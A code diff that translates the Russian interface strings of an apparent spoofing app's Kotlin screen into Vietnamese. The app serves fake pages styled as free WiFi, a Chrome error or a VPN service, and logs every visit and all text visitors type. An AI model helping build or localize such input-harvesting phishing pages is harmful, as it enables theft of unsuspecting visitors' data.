@@ -467,7 +467,7 @@ fun QrAudioSpooferScreen(
         val s = serverIp!!
         if (s.startsWith("http://")) s else "http://$s"
     } else if (isStarted) {
-        "Запуск локального сервера…"
+        "Đang khởi chạy máy chủ nội bộ…"
     } else {
         "Waiting..."
     }
@@ -485,7 +485,7 @@ fun QrAudioSpooferScreen(
         "wifi" to "Free WiFi",
         "error" to "Error (Chrome style)",
         "vpn" to "VPN Service",
-        "custom_html" to if (customHtmlName != null) "Импорт html ($customHtmlName)" else "Импорт html",
+        "custom_html" to if (customHtmlName != null) "Nhập HTML ($customHtmlName)" else "Nhập HTML",
     )
     val isCustomHtml = pageType == "custom_html"
 
@@ -649,8 +649,8 @@ fun QrAudioSpooferScreen(
             if (isCustomHtml) {
                 Spacer(modifier = Modifier.height(12.dp))
                 Text(
-                    "Импортированный стиль: только логи. Аудио-управление скрыто. " +
-                        "В логах: заходы на сайт и весь текст, введённый на странице.",
+                    "Giao diện HTML tùy chỉnh: chỉ ghi nhật ký truy cập. " +
+                        "Nhật ký sẽ hiển thị lượt truy cập và dữ liệu nhập trên trang.",
                     color = MaterialTheme.colorScheme.onSurfaceVariant,
                     fontSize = 12.sp,
                     modifier = Modifier.fillMaxWidth()
@@ -660,7 +660,7 @@ fun QrAudioSpooferScreen(
                     onClick = { htmlPickerLauncher.launch("*/*") },
                     modifier = Modifier.fillMaxWidth()
                 ) {
-                    Text("Заменить HTML")
+                    Text("Thay file HTML")
                 }
             }
 
@@ -670,7 +670,7 @@ fun QrAudioSpooferScreen(
 
             val deviceCount by viewModel.deviceCount.collectAsState()
             Text("SOUNDBOARD", color = MaterialTheme.colorScheme.onSurfaceVariant, fontSize = 12.sp, fontWeight = FontWeight.Bold, modifier = Modifier.fillMaxWidth())
-            Text("Подключено: $deviceCount устройств", color = accentColor, fontSize = 11.sp, modifier = Modifier.fillMaxWidth())
+            Text("Đã kết nối: $deviceCount thiết bị", color = accentColor, fontSize = 11.sp, modifier = Modifier.fillMaxWidth())
             Spacer(modifier = Modifier.height(8.dp))
             Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 SoundButton("", Icons.Default.Message, accentColor) { viewModel.sendCommand("PLAY:iphone_message.mp3") }
@@ -745,7 +745,7 @@ fun QrAudioSpooferScreen(
 
 
             Text(
-                if (isCustomHtml) "ЛОГИ САЙТА" else "TERMINAL LOGS",
+                if (isCustomHtml) "NHẬT KÝ TRANG WEB" else "TERMINAL LOGS",
                 color = MaterialTheme.colorScheme.onSurfaceVariant,
                 fontSize = 12.sp,
                 fontWeight = FontWeight.Bold,
